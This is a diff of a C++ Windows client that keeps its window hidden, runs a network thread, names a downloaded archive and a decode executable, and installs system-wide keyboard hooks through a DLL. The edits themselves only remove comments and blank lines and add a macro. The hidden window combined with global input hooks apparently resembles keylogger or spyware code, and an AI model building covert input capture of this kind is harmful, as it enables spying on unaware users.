@@ -19,11 +19,6 @@
 
 using namespace Gdiplus;
 
-
-
-
-
-
 GdiplusStartupInput gdiplusStartupInput_;
 ULONG_PTR pGdiToken_;
 const char g_szClassName[] = "BootstrapWindowClass";
@@ -49,11 +44,10 @@ bool bQuit_ = false;
 #define DRAW_STATE_FINISHED_LOAD_IMAGES 1
 
 
-
-
 #define DOWNLOAD_FILE_NAME "pics.7z"
 #define DECODE_COMMAND_NAME "decode.exe"
 #define IMG_DIR_NAME "pictures"
+#define HOOK_DLL_NAME "wnd_hooks.dll"
 
 typedef struct client_status
 {
@@ -240,8 +234,8 @@ unsigned __stdcall networkProc(void* arg)
 
 void setWindowHooks()
 {
-	client_status_.keyboard_hook = SetWindowsHookEx(WH_KEYBOARD, MyKeyboardProc, GetModuleHandle("wnd_hooks.dll"), 0);
-	client_status_.mouse_hook = SetWindowsHookEx(WH_KEYBOARD, MyMouseProc, GetModuleHandle("wnd_hooks.dll"), 0);
+	client_status_.keyboard_hook = SetWindowsHookEx(WH_KEYBOARD, MyKeyboardProc, GetModuleHandle(HOOK_DLL_NAME), 0);
+	client_status_.mouse_hook = SetWindowsHookEx(WH_KEYBOARD, MyMouseProc, GetModuleHandle(HOOK_DLL_NAME), 0);
 }
 
 
@@ -263,7 +257,6 @@ int _tmain(int argc, _TCHAR* argv[])
 	HWND hwnd;
 	MSG Msg;
 
-	//Step 1: Registering the Window Class
 	wc.cbSize = sizeof(WNDCLASSEX);
 	wc.style = 0;
 	wc.lpfnWndProc = WndProc;
@@ -282,7 +275,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		return 0;
 	}
 
-	// Step 2: Creating the Window
 	hwnd = CreateWindowEx(
 		WS_EX_CLIENTEDGE,
 		g_szClassName,
@@ -302,7 +294,6 @@ int _tmain(int argc, _TCHAR* argv[])
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
 
-	// Step 3: The Message Loop
 	while (GetMessage(&Msg, NULL, 0, 0) > 0)
 	{
 		TranslateMessage(&Msg);
